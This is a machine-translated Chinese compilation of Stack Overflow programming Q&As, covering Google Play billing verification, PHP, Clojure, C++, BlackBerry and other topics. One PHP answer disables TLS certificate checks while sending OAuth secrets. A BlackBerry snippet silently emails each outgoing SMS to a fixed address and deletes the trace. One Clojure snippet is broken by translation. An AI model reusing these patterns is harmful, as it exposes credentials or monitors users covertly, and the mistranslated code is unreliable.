                new ServiceAccountCredential.Initializer("{{ your service account email }}")
                {
                    Scopes = new[] { AndroidPublisherService.Scope.Androidpublisher }
                }.FromCertificate(certificate));

        var service = new AndroidPublisherService(new BaseClientService.Initializer()
        {
            HttpClientInitializer = credentials,
            ApplicationName = "my server app name",
        });
        return service.Purchases.Subscriptions.Get(packageName, productId, purchaseToken).ExecuteAsync();
    } 
```

祝你好运，希望这对某人有所帮助。

资料来源：

[将 OAuth 2.0 用于服务器到服务器应用程序](https://developers.google.com/identity/protocols/OAuth2ServiceAccount)

[适用于 Google.Apis.AndroidPublisher.v3 的 .Net 客户端库](https://developers.google.com/api-client-library/dotnet/apis/androidpublisher/v3)^([1])

* * *

1 [更新于 2020 年 4 月 11 日 - Google.Apis.AndroidPublisher.v2 EOL'd，使用 Google.Apis.AndroidPublisher.v3。]

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2014-02-10T13:03:57.543

如果您像我一样，并且想在**PHP**中执行此操作，那么这里是如何执行此操作的过程...感谢 Kalina 的回答，我只花了三天时间就弄清楚了它是如何工作的:)。

开始：

1.  转到谷歌开发者控制台[https://console.developers.google.com/](https://console.developers.google.com/)并创建一个**网络应用程序**。将“developers.google.com/oauthplayground”作为“重定向 URI”；您将在第 2 步中使用它。创建帐户时，您将获得一个客户端 ID 和客户端密码。确保您已添加**Google Play Android Developer API**。

2.  转到 Google oauth2 游乐场[https://developers.google.com/oauthplayground/](https://developers.google.com/oauthplayground/)。这个伟大的工具是你接下来几天最好的朋友。现在转到设置：确保设置了**使用您自己的 OAuth 凭据**。只有这样，您才能在下面的表格中填写您的*客户 ID*和*客户密码*。

3.  在**Google oauth2 Playground**中转到第 1 步**选择并授权 API**在输入字段*[https://www.googleapis.com/auth/androidpublisher](https://www.googleapis.com/auth/androidpublisher)*中填写范围。我在列表中找不到 Google Play Android Developer API，也许他们稍后会添加。点击**AUTORIZE APIS**。做下面的授权事情。

4.  在**Google oauth2 游乐场**中，转到第 2 步**交换令牌授权码**。如果一切顺利，您将看到以 /4 开头的授权码。如果某些事情进展不顺利，请检查右侧的错误消息。现在您点击“刷新访问令牌”。复制刷新令牌...它将以 /1 开头...

5.  现在您总能获得访问令牌！方法如下：

    ```
    $url ="https://accounts.google.com/o/oauth2/token";
    $fields = array(
       "client_id"=>"{your client id}",
       "client_secret"=>"{your client secret}",
       "refresh_token"=>"{your refresh token 1/.....}",
       "grant_type"=>"refresh_token"
    );

    $ch = curl_init($url);

    //set the url, number of POST vars, POST data
    curl_setopt($ch, CURLOPT_POST,count($fields));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    //execute post
    $lResponse_json = curl_exec($ch);

    //close connection
    curl_close($ch); 
    ```

现在你有一个访问令牌万岁...... JSON 将如下所示：

```
"access_token" : "{the access token}",  "token_type" : "Bearer",  "expires_in" : 3600 
```

最后，您可以向谷歌询问一些事情了！这是如何做到的：

```
$lAccessToken = "{The access token you got in}" ;
$lPackageNameStr = "{your apps package name com.something.something}";
$lURLStr =  "https://www.googleapis.com/androidpublisher/v1.1/applications/$lPackageNameStr/subscriptions/$pProductIdStr/purchases/$pReceiptStr";

$curl = curl_init($lURLStr);

curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
$curlheader[0] = "Authorization: Bearer " . $lAccessToken;
curl_setopt($curl, CURLOPT_HTTPHEADER, $curlheader);

$json_response = curl_exec($curl);
curl_close($curl);

$responseObj = json_decode($json_response,true); 
```

返回的 JSON 将包含两个时间戳，*initialTimestampMsec*和*validUntilTimestampMsec*，订阅有效的时间。两者都是添加到日期 1/1/1970 的毫秒数！

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2015-11-13T00:10:53.347

我不知道在 2012 年，但在 2015 年你不应该手动执行任何这些步骤。我很难找到文档，所以我在这里发布以防它对任何人有帮助。

1.  出于安全原因，您应该只从服务器查询应用内购买，否则您将无法信任购买过程的两端。

现在在服务器端（如果您绝对需要，我认为您仍然可以在您的应用程序中使用相同的代码），将`google-api-services-androidpublisher`客户端库包含到您的项目中（请参阅[https://developers.google.com/api-client-library/ java/apis/androidpublisher/v1](https://developers.google.com/api-client-library/java/apis/androidpublisher/v1) )

正如您所提到的，您需要一个带有 P12 文件的服务帐户（客户端库只接受 P12 文件）。

然后以下代码将很好地进行身份验证并获取购买信息：

```
 HttpTransport httpTransport = GoogleNetHttpTransport.newTrustedTransport();
    JsonFactory jsonFactory = new JacksonFactory();

    List<String> scopes = new ArrayList<String>();
    scopes.add(AndroidPublisherScopes.ANDROIDPUBLISHER);

    Credential credential = new GoogleCredential.Builder().setTransport(httpTransport).setJsonFactory(jsonFactory)
            .setServiceAccountId(googleServiceAccountId)
            .setServiceAccountPrivateKeyFromP12File(new File(googleServicePrivateKeyPath))
            .setServiceAccountScopes(scopes).build();
    AndroidPublisher publisher = new AndroidPublisher.Builder(httpTransport, jsonFactory, credential).build();
    AndroidPublisher.Purchases purchases = publisher.purchases();
    final Get request = purchases.get(packageName, productId, token);
    final SubscriptionPurchase purchase = request.execute();

    // Do whatever you want with the purchase bean 
```

可以在此处找到有关 Java 客户端身份验证的信息： [https ://developers.google.com/identity/protocols/OAuth2ServiceAccount](https://developers.google.com/identity/protocols/OAuth2ServiceAccount)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-14T18:49:20.943

我可能误解了您的问题，但我认为您没有理由使用您引用的链接来获取 Android 应用程序的应用内结算。这个页面更有帮助：

[http://developer.android.com/guide/google/play/billing/index.html](http://developer.android.com/guide/google/play/billing/index.html)

您可以试用其中包含的演示应用程序（Dungeons -- [http://developer.android.com/guide/google/play/billing/billing_integrate.html#billing-download](http://developer.android.com/guide/google/play/billing/billing_integrate.html#billing-download)）。这使用产品（一次性购买）而不是订阅，但您应该能够修改以测试您想要的内容。

我认为对您而言，关键是他们在示例中提供的 restoreTransactions 方法，以查看 Google Play 帐户是否有您的应用程序的任何订阅：

```
@Override
public void onRestoreTransactionsResponse(RestoreTransactions request, int responseCode) {
    if (responseCode == BillingVars.OK) {                        
        // Update the shared preferences so that we don't perform a RestoreTransactions again.
        // This is also where you could save any existing subscriptions/purchases the user may have.
        SharedPreferences prefs = getSharedPreferences(my_prefs_file, Context.MODE_PRIVATE);
        SharedPreferences.Editor edit = prefs.edit();
        edit.putBoolean(DB_INITIALIZED, true);
        edit.commit();
    } else {
        Log.e(TAG, "RestoreTransactions error: " + responseCode);
    }
} 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-07-26T03:41:11.523

如果有人对接受的帖子最后一步（＃7）有问题，我发现`?access_token=`工作而不是`?accessToken=`

太糟糕的堆栈溢出不会让我直接对线程发表评论......

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-09-23T14:19:45.810

As you have a web service which your app can call, I would recommend storing your private key securely on your server. You should look to moving as much of the in-app stuff to service calls, as possible, see [this link](https://stackoverflow.com/questions/8789658/in-the-billingservice-module-what-needs-to-be-modified-to-increase-security/9134578#9134578). I've implemented in-app subscription, but it was before this part of the API was out. I had to do my own registration and security verification but it looks like this API does most of that for you, using OAuth, although it looks like you are still responsible for storing the subscription request/verification.

Where it talks about signing your JWT's with an existing library, they do appear to provide you with links to a java library, a Python library and a PHP library - it depends what your web service or server component is written in (mine is C#, so I'm using RSACryptoServiceProvider) to verify signed purchases. They're using JSON objects for the actual transfer of data.

# c# - 接口属性的 L2S 方法

> ID：12427480
> 
> 赞同：1
> 
> 时间：2012-09-14T15:22:00.707
> 
> 标签：c#, linq-to-sql

我们正在使用 L2S，我们有一个这样的类：

```
public class HumanContainer
{
    public List<IHuman> Humans { get; set; }
    public string SomeOtherProperty { get; set; }
} 
```

**我们的数据库有这样的表：**
HumanContainer
- Geek

到目前为止，我们只有一种人类（极客）。当我们向/从数据库发送/检索 HumanContainers 时，我们知道将它们视为 Geek。现在我们需要第二个人类（运动员），我们可以选择如何实现它。

**一种选择是在数据库中创建另一个表（运动员）：**
HumanContainer
- Geek
- Athlete

对于像这样的每个新的具体 Human，我们需要遍历 HumanContainer.Humans，检测类型，将其添加到适当的 EntitySet<>，然后保存。

**另一种选择是只为所有人类提供一个表：**
HumanContainer
- Humans

如果我们这样做，那么我们将需要类似 XML 列的东西，我们将 Human 序列化为其特定类型并将其存储在该列中。然后我们需要在检索数据时反序列化该列。

是否推荐其中一种方法？我很想知道人们是如何处理这种情况的。有没有我没有在这里列出的第三种方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T16:01:16.133

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:15:52.277

我正确理解你的问题，在你的情况下，未来可能会有不同类型的人。您可以尝试以下解决方案。

解决方案1：

正如您提到的，仅在数据库“Humas”中创建一个表并将 Human 序列化为特定类型并将其存储在该列中，并在检索数据时反序列化该列。这个解决方案看起来不错，因为如果将来需要任何人类类型，我们不需要更改数据库设计。并且易于管理。

但是这种方案的缺点是，如果应用程序只需要 Geek Humans 类型，那么首先需要检索列数据并对其进行反序列化，然后我们才能找到 Geek Humans 类型。

解决方案2：

在数据库中创建两个表。1) HumanType：用于保存人类的类型（Geek、Athlete 或任何其他类型） 2) Human：存储人类信息。该表包含 HumanType 的引用键。

该解决方案的优点是您可以轻松地根据需求触发查询（例如，只有极客类型的人可以轻松地从表中获取）。如果有任何新的人类类型出现，则需要一个条目进入人类类型数据库。

# android - twitter登录回调安卓应用

> ID：12427484
> 
> 赞同：-1
> 
> 时间：2012-09-14T15:22:11.347
> 
> 标签：android, twitter, login, callback, twitter4j

我正在尝试使用 Twitter4j 库从我的 android 应用程序登录 twitter，但是在调用回调时它会崩溃......并出现这个屏幕：页面不是 disponible

这是我的代码：

```
 public class TwitterLogin extends Activity {
    /** Called when the activity is first created. */

    Twitter twitter;
    RequestToken requestToken;

    /*
    * Calls the OAuth login method as soon as its started
    */
        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
    //      setContentView(R.layout.main);
            OAuthLogin();
        }

    /*
    * - Creates object of Twitter and sets consumerKey and consumerSecret
    * - Prepares the URL accordingly and opens the WebView for the user to provide sign-in details
    * - When user finishes signing-in, WebView opens your activity back
    */
        void OAuthLogin() {
            try {
                twitter = new TwitterFactory().getInstance();
                twitter.setOAuthConsumer(TwitterConstants.CONSUMER_KEY,TwitterConstants.CONSUMER_SECRET_KEY);
                requestToken = twitter.getOAuthRequestToken(TwitterConstants.CALLBACK_URL);
                Log.w("TwitterLogin requestToken callbackUrl: "+requestToken.toString());
    //          requestToken = twitter.getOAuthRequestToken(OAuth.OUT_OF_BAND);
    //          String pin = requestToken.getParameter(OAuth.OAUTH_VERIFIER);
                String authUrl = requestToken.getAuthenticationURL();
                Log.w("TwitterLogin requestToken authUrl: "+authUrl);
                this.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(authUrl)));
                Log.w("TwitterLogin despres del startActivity intent");
                } catch (TwitterException ex) {
                Toast.makeText(this, ex.getMessage(), Toast.LENGTH_LONG).show();
                Log.e("in Main.OAuthLogin", ex.getMessage());
            }
        }

    /*
    * - Called when WebView calls your activity back.(This happens when the user has finished signing in)
    * - Extracts the verifier from the URI received
    * - Extracts the token and secret from the URL
    */
        @Override
        protected void onNewIntent(Intent intent) {
            super.onNewIntent(intent);
            Log.w("TwitterLogin  dintre del onNewIntent");
            Uri uri = intent.getData();

            Log.w("TwitterLogin uri: "+uri.toString());

                if (uri != null && uri.toString().startsWith(TwitterConstants.CALLBACK_URL)){

                    try {
                        String verifier = uri.getQueryParameter("oauth_verifier");
                        Log.w("TwitterLogin","onNewIntent oauth_verifier: "+verifier);
                        AccessToken accessToken = twitter.getOAuthAccessToken(requestToken, verifier);
                        Log.w("TwitterLogin","onNewIntent accesToken: "+accessToken.toString());
                        String token = accessToken.getToken(), secret = accessToken.getTokenSecret();
                        displayTimeLine(token, secret); //after everything, display the first tweet

                    } catch (TwitterException ex) {
                        Log.e("Main.onNewIntent", "" + ex.getMessage());
                    }
                }

        }

    /*
    * Displays the timeline's first tweet in a Toast
    */

        @SuppressWarnings("deprecation")
        void displayTimeLine(String token, String secret) {
            if (null != token && null != secret) {
                List<Status> statuses = null;
                try {
                    twitter.setOAuthAccessToken(token, secret);
                    statuses = twitter.getFriendsTimeline();
                    Toast.makeText(this, statuses.get(0).getText(), Toast.LENGTH_LONG)
                    .show();
                } catch (Exception ex) {
                    Toast.makeText(this, "Error:" + ex.getMessage(),
                    Toast.LENGTH_LONG).show();
                    Log.d("Main.displayTimeline",""+ex.getMessage());
                }

            } else {
                Toast.makeText(this, "Not Verified", Toast.LENGTH_LONG).show();
            }
        }
    } 
```

如果有人可以帮助我，我已经尝试在 Twitter 上登录 2 天，但我不知道如何解决这个问题。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:52:38.947

您在推特​​上注册您的应用程序时是否为您的应用程序提供了回调 URL。？

如果您提供了回调 URL，则在 android 客户端中使用相同的 URL...

因为您正在通过回调发出请求

requestToken = twitter.getOAuthRequestToken(TwitterConstants.CALLBACK_URL);

然后服务器在登录成功后也会回复回调到 twitter。

# c++ - 复制构造函数可以是转换运算符吗？

> ID：12427487
> 
> 赞同：0
> 
> 时间：2012-09-14T15:22:23.900
> 
> 标签：c++

考虑以下代码。

```
#include <iostream>

using namespace std;

class Test
{
        private:
                int x,y;
        public:
                Test () {
                        cout <<" Inside Constructor "<<endl;
                        x=100;
                }   
                explicit Test (const Test & t)
                {   
                        cout <<"Inside Copy Constructor "<<endl;
                        x = t.x;
                }   
                void display()
                {   
                        cout <<" X is "<<x<<endl;
                }   

};

int main (int argc, char ** argv){
  Test t;
  t.display(); 

 cout <<"--- Using Copy constructor "<<endl;
 Test t2(t);
 t2.display (); 

 Test t3=t2;
 t3.display (); 

} 
```

Test (const Test & t) -> 是一个拷贝构造函数

**问题：**

与“转换运算符”相同吗？测试 t3 = t2 [此处复制构造函数被视为转换运算符]

我不确定我的理解是否正确？如果我错了，请纠正我？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:25:59.723

```
 Test t3=t2; 
```

永远不应该编译，如果`copy c-tor`是`explicit`.

n3337 12.3.1/3

> 非显式复制/移动构造函数 (12.8) 是转换构造函数。隐式声明的复制/移动构造函数不是显式构造函数；可能会调用它进行隐式类型转换。

这句话出现在以下问题：[隐式复制构造函数](https://stackoverflow.com/questions/12428308/implicit-copy-constructor)

因此，在您的情况下，它不是转换构造函数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:27:31.047

在 C++ 中，术语*转换*意味着两种不同的类型：*源类型*和*目标类型*。

根据定义，复制构造函数只涉及一种类型：源类型和目标类型相同。所以它不能称为转换函数。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-09-14T15:25:13.713

当您使用 T t3 = t2 时。它将调用您尚未定义的赋值运算符。

# email - 发送外发短信时出错

> ID：12427488
> 
> 赞同：0
> 
> 时间：2012-09-14T15:22:25.497
> 
> 标签：email, blackberry, sms

无论如何，无需导入即可收听出站短信`javax.wireless.messaging`？

我正在尝试编写一个应用程序来侦听从设备发送的短信，然后通过电子邮件发送短信的消息，但我收到错误消息：

> 对 Message 的引用不明确，javax.wireless.messaging 中的 javax.wireless.messaging.Message 类和 net.rim.blackberry.api.mail 中的 net.rim.blackberry.api.mail.Message 类都匹配

我需要导入`net.rim.blackberry.api.mail.Message`才能发送电子邮件。

有没有办法解决这个问题，因为这两个包似乎发生了冲突。

我的代码：

```
public void notifyIncomingMessage(MessageConnection messageconnection) {}

public void notifyOutgoingMessage(javax.wireless.messaging.Message message) {

    try {
        String address = message.getAddress();

        String msg = null;

        if ( message instanceof TextMessage ) {
            TextMessage tm = (TextMessage)message;
            msg = tm.getPayloadText();

        } else if (message instanceof BinaryMessage) {
            StringBuffer buf = new StringBuffer();
            byte[] data = ((BinaryMessage) message).getPayloadData();
            msg = new String(data, "UTF-8");

            Store store = Session.getDefaultInstance().getStore();

            Folder[] folders = store.list(Folder.SENT);
            Folder sentfolder = folders[0];

            Message in = new Message(sentfolder);
            Address recipients[] = new Address[1];

            recipients[0]= new Address("me@us.com", "user");

            in.addRecipients(Message.RecipientType.TO, recipients);
            in.setSubject("Outgoing sms");
            in.setContent("You have just sent an sms to: " + address + "\n" + "Message: " + msg);

            in.setPriority(Message.Priority.HIGH);

            Transport.send(in);

            in.setFlag(Message.Flag.OPENED, true);
            Folder folder = in.getFolder();
            folder.deleteMessage(in);               
        }
    } catch (IOException me) {
        System.out.println(me);
    }
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-16T03:35:15.230

在 Java 中你永远**不需要任何东西。**`import`导入包只是一种快捷方式，因此您不必完全输入整个包名。如果您有一个`Message`要使用的类，并且它存在于两个包中（您都需要），那么我不会`import`使用它们。

简单地说，总是用它们的完全限定名称来引用它们：

```
net.rim.blackberry.api.mail.Message 
```

和

```
javax.wireless.messaging.Message 
```

只是打字多一点。

# sql - 从 SQL 查询的值中选择参数

> ID：12427491
> 
> 赞同：0
> 
> 时间：2012-09-14T15:22:35.450
> 
> 标签：sql, parameters, crystal-reports, report

我需要生成一个报告，该报告从基于公司的数据库表中选择一组值。我希望用户能够从可用公司列表中选择公司名称。这些公司有 2 个关联的唯一数据库 ID 代码。根据用户选择的公司，我需要 sql 查询将两个唯一代码传递给参数。所以，简而言之，我如何创建一个显示公司名称的 sql 查询，然后在选择公司时会根据我从单个选择下拉列表中选择的公司名称选择两个唯一代码。使用从该下拉列表中选择的值在报表本身中运行 SQL 查询？

感谢您提供的任何帮助或建议！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:29:50.543

将公司名称传递给您的存储过程，而不是两个唯一代码，然后在您的过程中找到公司的代码。

```
CREATE someProc (@Company VARCHAR(100))
AS BEGIN

DECLARE @ID1 INT, @ID2 INT

SELECT @ID1 = someID1, @ID2 = someID2
FROM someDatabase
WHERE companyName=@Company 
```

# c# - 以编程方式检查 C# 中的类中的更改

> ID：12427493
> 
> 赞同：1
> 
> 时间：2012-09-14T15:22:49.737
> 
> 标签：c#

有没有办法检查 C# 中类的大小？

我问的原因是：

我有一个将类的数据存储在文件中的例程，以及一个从同一个文件加载该对象（类）的不同例程。每个属性都以特定顺序存储，如果您更改此类，则必须提醒您这些导出/导入例程需要更改。

C++ 中的一个示例（无论这可能是多么笨拙或糟糕的编程）如下：

```
#define PERSON_CLASS_SIZE 8
class Person
{
  char *firstName;
} 
```

...

```
bool ExportPerson(Person p)
{
  if (sizeof(Person) != PERSON_CLASS_SIZE ) 
  {  
     CatastrophicAlert("You have changed the Person class and not fixed this export routine!")
  }
} 
```

因此，在编译之前，您需要知道 Person 的大小，并相应地修改具有此大小的导出/导入例程。

有没有办法在 C# 中做类似的事情，或者是否有其他方法可以“确保”不同的开发人员在更改类时更改导入/导出例程。

...除了明显的“只在课堂上评论这个，这可以保证开发人员永远不会搞砸” - 答案。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:24:58.733

> 每个属性都以特定顺序存储，如果您更改此类，则必须提醒您这些导出/导入例程需要更改。

听起来您正在编写自己的序列化机制。如果是这种情况，您可能应该以正确的顺序包含某种预期属性的“指纹”，并在读取时对其进行验证。然后，您可以将当前指纹包含在单元测试中，如果添加属性，它将失败。然后可以采取适当的行动（例如迁移现有数据）并更新单元测试。

仅检查类的*大小*肯定不会发现所有错误 - 如果您在同一更改中添加了一个属性并删除了一个相同大小的属性，您可能会在不注意的情况下破坏数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:31:15.387

部分原因可能不是实现您需要的最佳方法，我认为最快的方法是使用[Cecil](http://www.mono-project.com/Cecil)。您可以获得整个班级的 IL 正文。

# settings - 获取 Agilent 54642D 示波器波形和设置

> ID：12427506
> 
> 赞同：0
> 
> 时间：2012-09-14T15:23:39.013
> 
> 标签：settings, labview, waveform, visa, oscilloscope

我想使用 LabVIEW 来捕捉已经显示在我的安捷伦示波器（型号 54642D）屏幕上的波形。有了这个波形，我还想获得示波器通道的当前设置（伏特/格、时间/格、探头衰减、延迟、偏移、带有频率/周期的光标等）。换句话说，我使用示波器（不是 LabVIEW）采集信号，在示波器的前面板上根据自己的喜好调整示波器设置，然后我想使用以下设置捕获示波器屏幕上显示的确切波形示波器。

我一直在使用项目风格的驱动程序，在这里找到：[http ://sine.ni.com/apps/utf8/niid_web_display.model_page?p_model_id=724](http://sine.ni.com/apps/utf8/niid_web_display.model_page?p_model_id=724)

这适用于控制示波器设置和采集波形，但这不是我想要的。我只是想让 LabVIEW 捕获示波器显示的当前状态和使用的设置。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-23T20:39:03.997

有关解决方案，请访问 NI 论坛上的以下链接：

[http://forums.ni.com/t5/LabVIEW/Acquiring-Agilent-54642D-Oscilloscope-Waveform-AND-Settings/td-p/2157218#M695868](http://forums.ni.com/t5/LabVIEW/Acquiring-Agilent-54642D-Oscilloscope-Waveform-AND-Settings/td-p/2157218#M695868)

# c# - SignalR 作为 WCF 绑定

> ID：12427509
> 
> 赞同：3
> 
> 时间：2012-09-14T15:23:47.493
> 
> 标签：c#, wcf, signalr

我在我的应用程序中使用基于 REST、TCP 和 WsHTTP 的 WCF 服务。

有没有办法将 SignalR 用作 WCF 的一部分作为 WCF 绑定？如果现在不可用，有什么计划吗？

谢谢

# php - 连接两个变量

> ID：12427515
> 
> 赞同：2
> 
> 时间：2012-09-14T15:24:04.357
> 
> 标签：php, variables

这是我正在尝试做的事情：

```
$errmsg_1 = 'Please make changes to your post';
$errmsg_2 = 'Please make changes to your post image';

$error = 1;

echo $errmsg_.$error; //'Please make changes to your post'; 
```

什么都行不通，并且有很多像这些错误消息我必须回应。

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-14T15:27:57.070

您所要求的被称为*变量变量*——有关更多信息，请参见[http://uk.php.net/manual/en/language.variables.variable.php](http://uk.php.net/manual/en/language.variables.variable.php)。

但请不要那样做；它被认为是非常糟糕的编码实践。

你真正需要的是一个数组：

```
$errmsg = array(
    'Please make changes to your post',       //this will be $errmsg[0]
    'Please make changes to your post image'  //this will be $errmsg[1]
);

$error = 0;   //nb: arrays start at item number 0, not 1.

echo $errmsg[$error]; 
```

这比处理可变变量要好得多。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-14T15:27:47.300

将错误消息存储在数组中：

```
$errmsg[1] = 'Please make changes to your post';
$errmsg[2] = 'Please make changes to your post image';

// and so on

$error = 1;

echo $errmsg[$error]; 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-14T15:26:58.300

尝试

```
echo {'$errmsg_' . $error}; 
```

虽然你这样做真的很不正确。您应该改用数组；连接变量名是不好的做法，会导致代码混乱/不可读/损坏。使用数组将像这样工作：

```
$errors = array(
    'Please make changes to your post',
    'Please make changes to your post image'
);

echo $errors[$error]; 
```

尽管请记住`$error`从 0 开始，因为数组是基于 0 索引的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-14T15:26:24.670

我想你想要`$errmsg_{$error}`的，但我现在无法测试/仔细检查。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-14T15:27:23.613

这应该有效：

```
$errmsg_1 = 'Please make changes to your post';
$errmsg_2 = 'Please make changes to your post image';

$error = 1;

echo ${'errmsg_ ' . $error}; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-14T15:37:23.580

```
$error_msg = 'Please make changes to your ';
$error[1] = 'post';
$error[2] = 'post image';

for($i=1; $i<=count($error); $i++)
 echo $error_msg . $error[$i]; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-09-14T15:28:18.007

没有冒犯的意思，但你所做的是糟糕的设计。

一个小但并非完美的解决方案是将您的错误存储为数组。

```
$errors = array('Please make changes to your post', 'Please make changes to your post image');
$error = 0;
echo $errors[$error]; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-09-14T15:28:47.847

尝试使用这个`${$errmsg_.$error}`

这是一个变量变量： http: [//php.net/manual/en/language.variables.variable.php](http://php.net/manual/en/language.variables.variable.php)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-09-14T15:29:23.200

您正在尝试这样做：

```
function errorMsg($code)
{
  $msg;
  switch($code)
  {
  case 1:
    $msg = 'Please make changes to your post';
    break;

  case 2:
    $msg = 'Please make changes to your post image';
    break;
  }
  return $msg;
}

echo errorMsg(1); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-09-14T15:57:33.780

使用数组。保留索引以方便将来参考，以及易于更改错误消息和组织 API。

```
$errmsg = array(
    1 => 'Please make changes to your post',
    2 => 'Please make changes to your post image'
);

$error = 1;

echo $errmsg[$error]; //'Please make changes to your post'; 
```

# clojure - Clojure lazy-seq over Java 迭代代码

> ID：12427518
> 
> 赞同：1
> 
> 时间：2012-09-14T15:24:13.963
> 
> 标签：clojure, iteration

我正在尝试从我继承的一些迭代 Java 库代码中创建一个 Clojure seq。基本上，Java 代码所做的是使用解析器从文件中读取记录，将这些记录发送到处理器并返回结果的 ArrayList。在 Java 中，这是通过调用 parser.readData()，然后调用 parser.getRecord() 来获取记录，然后将该记录传递给 processor.processRecord() 来完成的。对 parser.readData() 的每次调用都返回一条记录，如果没有更多记录，则返回 null。Java中很常见的模式。

所以我在 Clojure 中创建了这个 next-record 函数，它将从解析器中获取下一条记录。

```
(defn next-record
  "Get the next record from the parser and process it."
  [parser processor]
  (let [datamap (.readData parser)
        row (.getRecord parser datamap)]
    (if (nil? row)
    nil
    (.processRecord processor row 100)))) 
```

然后的想法是调用此函数并将记录累积到 Clojure seq（最好是惰性 seq）中。所以这是我的第一次尝试，只要没有太多记录，它就可以很好地工作：

```
(defn datamap-seq
  "Returns a lazy seq of the records using the given parser and processor"
  [parser processor]
  (lazy-seq
    (when-let [records (next-record parser processor)]
      (cons records (datamap-seq parser processor))))) 
```

我可以创建一个解析器和处理器，并执行类似 (take 5 (datamap-seq parser processor)) 之类的操作，这给了我一个惰性序列。正如预期的那样，获得该 seq 的（第一个）只实现一个元素，执行 count 实现所有元素，等等。这正是我对惰性 seq 所期望的行为。

当然，当有很多记录时，我最终会遇到 StackOverflowException。所以我的下一个尝试是使用循环递归来做同样的事情。

```
(defn datamap-seq
  "Returns a lazy seq of the records using the given parser and processor"
  [parser processor]
  (lazy-seq
    (loop [records (seq '())]
      (if-let [record (next-record parser processor)]
        (recur (cons record records))
        records)))) 
```

现在以相同的方式使用它并使用 (def results (datamap-seq parser processor)) 定义它给了我一个惰性序列并且没有实现任何元素。但是，一旦我做任何其他事情（例如（第一个结果）），它就会强制实现整个 seq。

谁能帮助我理解我在第二个函数中出错的地方，使用循环递归导致它实现整个事情？

更新：

我已经从异常中仔细查看了堆栈跟踪，并且堆栈溢出异常是从 Java 类之一引发的。但是只有当我有这样的 datamap-seq 函数时才会发生这种情况（我上面发布的那个确实有效）：

```
(defn datamap-seq
  "Returns a lazy seq of the records using the given parser and processor"
  [parser processor]
  (lazy-seq
    (when-let [records (next-record parser processor)]
      (cons records (remove empty? (datamap-seq parser processor)))))) 
```

我真的不明白为什么删除会导致问题，但是当我把它从这个功能中取出时，它一切正常（我现在正在其他地方删除空列表）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T16:06:43.113

loop/recur*在循环表达式中循环，*直到递归用完。在它周围添加一个惰性序列不会阻止这种情况。

您第一次尝试使用lazy-seq / cons 应该已经按照您的意愿工作，没有堆栈溢出。我现在无法发现它的问题是什么，尽管它可能在代码的 java 部分。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T16:14:40.053

除了 Joost 的回答，我将在这里发布。这段代码：

```
（定义整数 [开始]
  （惰性序列
    （缺点
      开始
      （整数（inc start）））））

```

如果我这样做，将不会抛出 StackOverflowExceptoin：

```
(take 5 (drop 1000000 (integers))) 
```

编辑：

当然，更好的方法是`(iterate inc 0)`. :)

编辑2：

我将尝试解释一下lazy-seq是如何工作的。[lazy-seq](https://github.com/clojure/clojure/blob/master/src/clj/clojure/core.clj#L624)是一个返回类似 seq 的对象的宏。再加上在被要求之前没有*意识到*它的第二个参数的[缺点，你会变得懒惰。](https://github.com/clojure/clojure/blob/master/src/jvm/clojure/lang/RT.java#L554)

 *现在看看[LazySeq 类](https://github.com/clojure/clojure/blob/master/src/jvm/clojure/lang/LazySeq.java#L37)是如何实现的。`LazySeq.sval`触发下一个值的计算，该值返回另一个“冻结”惰性序列实例。方法[LazySeq.seq](https://github.com/clojure/clojure/blob/master/src/jvm/clojure/lang/LazySeq.java#L59)甚至更好地展示了这个概念背后的机制。请注意，要完全实现序列，它使用 while 循环。它本身意味着堆栈跟踪的使用仅限于返回另一个 LazySeq 实例的短函数调用。

我希望这有任何意义。我描述了我可以从源代码中推断出的内容。如果我犯了任何错误，请告诉我。*

# c - 在父进程退出时杀死子进程

> ID：12427524
> 
> 赞同：2
> 
> 时间：2012-09-14T15:24:34.560
> 
> 标签：c, parent-child, kill, zombie-process, atexit

我对 c 和编程非常陌生，需要一些帮助。在 linux(cygwin) 上的 c 中，我需要在退出时删除所有子进程。我已经查看了其他类似的问题，但无法使其正常工作。我试过了-

```
atexit(killzombies); //in parent process

void killzombies(void)
{
    printf("works");
